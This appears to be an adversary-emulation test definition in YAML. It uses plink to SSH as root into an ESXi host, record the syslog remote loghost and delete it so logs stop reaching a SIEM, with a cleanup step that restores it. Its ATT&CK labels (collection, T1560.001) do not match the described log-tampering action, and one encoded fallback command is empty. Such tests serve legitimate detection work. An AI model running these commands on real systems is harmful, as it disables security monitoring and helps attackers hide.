- requirements: []
  name: Soumaia ART Tests - ESXi - Remove Syslog remote IP
  description: An adversary may edit the syslog config to remove the loghost in order to prevent or redirect logs being received by SIEM. (requires elevation)
  tactic: collection
  technique_id: T1560.001
  technique_name: 'Archive Collected Data: Archive via Utility'
  executors:
  - cleanup:
    - $env:TEMP\ART-ExternalPayloads\plink.exe -ssh atomic.local -l root -pw n/a -m c:\temp\loghost_ip.txt; rm c:\temp\loghost_ip.txt; rm c:\temp\loghost.txt
    timeout: 60
    platform: windows
    name: psh
    payloads:
    - esxi_get_loghost.txt
    - esxi_remove_loghost.txt
    parsers: []
    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABwAGwAaQBuAGsALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand  }; $env:TEMP\ART-ExternalPayloads\plink.exe -ssh atomic.local -l root -pw n/a -m .\esxi_get_loghost.txt | findstr /r "[0-9]*\.[0-9]*\.[0-9]*\." > c:\temp\loghost.txt; $env:TEMP\ART-ExternalPayloads\plink.exe -ssh atomic.local -l root -pw n/a -m .\esxi_remove_loghost.txt; $inputFilePath = "c:\temp\loghost.txt"; $outputFilePath = "c:\temp\loghost_ip.txt"; $fileContent = Get-Content -Path $inputFilePath -Raw; if ([string]::IsNullOrWhiteSpace($fileContent)) { Write-Host "The content is $fileContent"; Write-Host "The file is empty" } else { $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value; $output = "esxcli system syslog config set --loghost=" + $ipAddresses; $output | Out-File -FilePath $outputFilePath -Encoding ascii; Write-Host "IP addresses extracted and saved to $outputFilePath" }
  id: ebc1cf4c-39fc-522e-9e6e-80add4875d84
